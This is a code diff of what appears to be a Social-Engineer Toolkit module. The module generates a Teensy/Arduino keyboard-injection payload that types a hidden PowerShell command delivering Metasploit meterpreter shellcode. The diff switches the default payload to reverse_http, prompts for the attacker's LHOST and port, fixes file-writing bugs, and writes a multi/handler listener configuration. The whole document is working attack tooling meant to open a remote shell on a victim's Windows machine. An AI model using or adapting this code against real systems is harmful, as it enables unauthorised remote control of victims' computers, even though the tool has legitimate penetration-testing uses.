@@ -20,18 +20,19 @@ The powershell - shellcode injection leverages powershell to send a meterpreter 
 This technique was introduced by Matthew Graeber (http://www.exploit-monday.com/2011/10/exploiting-powershells-features-not.html)
 """)
 
-# define standard metasploit payload
-payload = "windows/meterpreter/reverse_tcp"
+payload = input('Enter the payload name [or Enter for windows/meterpreter/reverse_http]: ')
+if payload == '':
+    payload = 'windows/meterpreter/reverse_http'
 
 # create base metasploit payload to pass to powershell.prep
 with open(os.path.join(core.setdir + "metasploit.payload"), 'w') as filewrite:
     filewrite.write(payload)
 
-ipaddr = input("Enter the IP for the reverse: ")
-port = input("Enter the port for the reverse: ")
+ipaddr = input("Enter the IP of the LHOST: ")
+port = input("Enter the port for the LHOST: ")
 
 shellcode = core.generate_powershell_alphanumeric_payload(payload, ipaddr, port, "")
-with open(os.path.join(core.setdir + 'x86.powershell', 'w')) as filewrite:
+with open(os.path.join(core.setdir + 'x86.powershell'), 'w') as filewrite:
     filewrite.write(shellcode)
 
 time.sleep(3)
@@ -40,18 +41,18 @@ with open(os.path.join(core.setdir + "x86.powershell")) as fileopen:
     # read in x amount of bytes
     data_read = int(50)
 
-    output_variable = "#define __PROG_TYPES_COMPAT__\n#define PROGMEM\n#include <avr/pgmspace.h>\n"
+    output_variable = "#define __PROG_TYPES_COMPAT__\n#include <avr/pgmspace.h>\n"
 
     counter = 0
     while True:
         reading_encoded = fileopen.read(data_read).rstrip()
         if not reading_encoded:
             break
-        output_variable += "const char RevShell_{0}[] PROGMEM = '{1}';\n".format(counter, reading_encoded)
+        output_variable += 'const char RevShell_{0}[] = {{"{1}"}};\n'.format(counter, reading_encoded)
         counter += 1
 
 rev_counter = 0
-output_variable += "const char exploit[] PROGMEM = {\n"
+output_variable += "const char * exploit[] = {\n"
 
 while rev_counter != counter:
     output_variable += "RevShell_{0}".format(rev_counter)
@@ -77,7 +78,7 @@ void loop()
   delay(5000);
   CommandAtRunBar("cmd");
   delay(750);
-  Keyboard.print("powershell -nop -window hidden -noni -EncodedCommand ");
+  Keyboard.print("%s");
   // Write the binary to the notepad file
   int i;
   for (i = 0; i < sizeof(exploit)/sizeof(int); i++) {
@@ -148,20 +149,20 @@ Keyboard.set_modifier(0);
 Keyboard.set_key1(0);
 Keyboard.send_now();
 }
-""")
-print("[*] Payload has been extracted. Copying file to {0}".format(os.path.join(core.setdir + "reports/teensy.pde")))
+""" % (core.powershell_encodedcommand())
+print("[*] Payload has been extracted. Copying file to {0}".format(os.path.join(core.setdir + "reports/teensy.ino")))
 if not os.path.isdir(os.path.join(core.setdir + "reports")):
     os.makedirs(os.path.join(core.setdir + "reports"))
-with open(os.path.join(core.setdir + "/reports/teensy.pde", "w")) as filewrite:
+with open(os.path.join(core.setdir + "reports/teensy.ino"), "w") as filewrite:
     filewrite.write(teensy)
-choice = core.yesno_prompt("0", "Do you want to start a listener [yes/no]: ")
+choice = core.yesno_prompt("0", "Do you want to start a listener [yes/no] ")
 if choice == "YES":
 
     # Open the IPADDR file
     if core.check_options("IPADDR=") != 0:
         ipaddr = core.check_options("IPADDR=")
     else:
-        ipaddr = input(core.setprompt(["6"], "IP address to connect back on"))
+        ipaddr = input("LHOST IP address to connect back on: ")
         core.update_options("IPADDR=" + ipaddr)
 
     if core.check_options("PORT=") != 0:
@@ -170,7 +171,7 @@ if choice == "YES":
     else:
         port = input("Enter the port to connect back on: ")
 
-    with open(os.path.join(core.setdir + "/metasploit.answers", "w")) as filewrite:
+    with open(os.path.join(core.setdir + "metasploit.answers"), "w") as filewrite:
         filewrite.write("use multi/handler\n"
                         "set payload {0}\n"
                         "set LHOST {1}\n"
